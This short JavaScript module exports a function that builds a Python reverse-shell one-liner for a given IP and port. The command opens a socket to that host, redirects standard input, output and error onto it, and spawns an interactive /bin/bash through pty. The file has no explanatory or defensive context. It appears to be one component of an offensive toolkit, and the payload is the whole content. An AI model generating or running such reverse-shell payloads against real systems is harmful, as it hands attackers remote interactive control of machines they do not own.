module.exports = (ip, port) => 
  `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));` +
  `os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
